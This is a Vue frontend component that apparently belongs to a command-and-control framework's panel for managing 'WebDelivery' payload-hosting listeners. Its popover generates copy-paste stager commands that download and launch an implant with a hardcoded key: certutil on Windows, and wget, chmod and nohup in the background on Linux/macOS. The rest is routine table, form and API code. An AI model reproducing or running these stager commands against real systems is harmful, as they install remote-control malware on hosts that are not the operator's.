<template>
  <div>
    <el-button type="primary" size="default" @click="dialogVisible = true">
      新增 WebDelivery
    </el-button>
    <br>
    <br>
    <el-table :data="tableData">
      <el-table-column prop="ListenerConfig" label="Listener"/>
      <el-table-column prop="OS" label="操作系统" width="150"/>
      <el-table-column prop="Arch" label="架构" width="150"/>
      <el-table-column prop="ListeningPort" label="监听端口" width="150"/>
      <el-table-column label="状态" prop="Status" width="150">
        <template #default="{ row }">
          <el-tag :type="row.Status === 1 ? 'success' : 'danger'" size="default">
            {{ row.Status === 1 ? '开启' : '关闭' }}
          </el-tag>
        </template>
      </el-table-column>
      <el-table-column label="操作">
        <template #default="scope">
          <el-popover
              placement="top"
              :width="500"
              trigger="click"
              :content="scope.row.os === 'windows' ? `certutil -urlcache -split -f ${scope.row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe tNROopcR45q4Z8I1`:`wget -P /tmp ${scope.row.ServerAddress}; chmod +x /tmp/${scope.row.FileName}; nohup /tmp/${scope.row.FileName} tNROopcR45q4Z8I1 > m.log 2>&1 &`"
          >
            <template #reference>
              <el-button size="small" v-if="scope.row.Status === 1" type="success">上线命令</el-button>
            </template>
          </el-popover>
          <el-button size="small" v-if="scope.row.Status === 2" type="success" @click="handleOpen(scope.row)">开启</el-button>
          <el-button size="small" v-if="scope.row.Status === 1" type="primary" @click="handleClose(scope.row)">关闭</el-button>
          <el-button size="small" type="danger" @click="handleDelete(scope.row)">删除</el-button>
        </template>
      </el-table-column>
      <!--    <el-table-column label="上线命令">-->
      <!--      <template #default="scope">-->

      <!--      </template>-->
      <!--    </el-table-column>-->
    </el-table>

    <el-dialog v-model="dialogVisible" title="配置WebDelivery">
      <el-card class="box-card">
        <div class="form-container">
          <!-- 操作系统选择 -->
          <el-form :model="formData" label-width="120px">

            <el-form-item label="Listener">
              <el-select v-model="formData.listener" placeholder="选择listener" @visible-change="handleDropdown">
                <el-option v-for="item in options" :key="item" :label="item" :value="item" />
              </el-select>
            </el-form-item>

            <el-form-item label="操作系统">
              <el-select v-model="formData.os" placeholder="选择操作系统" @change="handleOSChange">
                <el-option v-for="os in osOptions" :key="os.value" :label="os.label" :value="os.value" />
              </el-select>
            </el-form-item>

            <!-- 架构选择 -->
            <el-form-item label="架构">
              <el-select v-model="formData.arch" placeholder="选择架构" :disabled="archOptions.length === 0">
                <el-option v-for="arch in archOptions" :key="arch" :label="arch" :value="arch" />
              </el-select>
            </el-form-item>

            <el-form-item label="监听端口">
              <el-input v-model="formData.port" :style="{ width: '200px' }" placeholder="输入监听端口">
              </el-input>
            </el-form-item>

            <el-form-item label="文件名称">
              <el-input v-model="formData.filename" :style="{ width: '200px' }" placeholder="输入挂载的文件名称">
              </el-input>
            </el-form-item>
          </el-form>

          <!-- 生成按钮 -->
          <el-button type="primary" @click="handleWebDelivery" :disabled="!formData.os || !formData.arch">
            确定
          </el-button>
        </div>
      </el-card>
    </el-dialog>
  </div>



</template>

<script setup lang="ts">
import {ref,reactive,onMounted} from "vue"
import {ElMessage} from "element-plus"

const tableData = ref([]);
const dialogVisible = ref(false);
import ClientAPI from "@/api/clients";

const options = ref([]);

const handleDropdown = async()=>{
  const res = await ClientAPI.ShowListener()
  if (res.status ===200){
    if (res.data.status ===200){
      options.value = res.data.data
    }else{
      ElMessage.error(res.data.data)
    }
  }else{
    ElMessage.error("Something wrong")
  }
}

const osOptions = [
  { label: 'windows', value: 'windows' },
  { label: 'linux', value: 'linux' },
  { label: 'darwin', value: 'darwin' }
];

const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64','loong64','mips','mipsle','mips64','mips64le'],
  darwin: ['amd64', 'arm64']
};

// 表单数据
const formData = reactive({
  port:'',
  listener:'',
  os: '',
  arch: '',
  filename:''
});

// 架构选项
const archOptions = reactive<string[]>([]);

// 处理操作系统切换
const handleOSChange = (os: string) => {
  formData.arch = ''; // 清空架构选择
  archOptions.splice(0, archOptions.length, ...(archMapping[os] || []));
};

const getWebDeliveryList = async()=>{
  const res = await ClientAPI.GetWebDeliveryList();
  if (res.status ===200){
    if(res.data.status ===200){
      tableData.value = res.data.data
    }else{
      ElMessage.error(res.data.data)
    }

  }else{
    ElMessage.error("Something wrong")
  }
}
const handleWebDelivery = async()=>{
  const res = await ClientAPI.StartWebDelivery({listener:formData.listener,os:formData.os,arch:formData.arch,port:formData.port,filename:formData.filename})
  if (res.status ===200){
    if(res.data.status ===200){
      ElMessage.success("添加成功")
      await getWebDeliveryList();
    }else{
      ElMessage.error(res.data.data)
    }

  }else{
    ElMessage.error("Something wrong")
  }
  dialogVisible.value=false
}

const handleClose = async(row :any)=>{
  const res = await ClientAPI.CloseWebDelivery({port:row.ListeningPort})
  if (res.status ===200){
    if(res.data.status === 200){
      ElMessage.success("关闭成功")
      await getWebDeliveryList();
    }
  }
}
const handleOpen = async(row :any)=>{
  const res = await ClientAPI.OpenWebDelivery({port:row.ListeningPort})
  if (res.status ===200){
    if(res.data.status === 200){
      ElMessage.success("开启成功")
      await getWebDeliveryList();
    }
  }
}
const handleDelete = async(row :any)=>{
  const res = await ClientAPI.DeleteWebDelivery({port:row.ListeningPort})
  if (res.status ===200){
    if(res.data.status === 200){
      ElMessage.success("删除成功")
      await getWebDeliveryList();
    }
  }
}


onMounted(async()=>{
  await getWebDeliveryList();
})
</script>

<style scoped>
.box-card {
  max-width: 500px;
  margin: 20px auto;
  padding: 20px;
}

.form-container {
  display: flex;
  flex-direction: column;
  gap: 20px;
}
</style>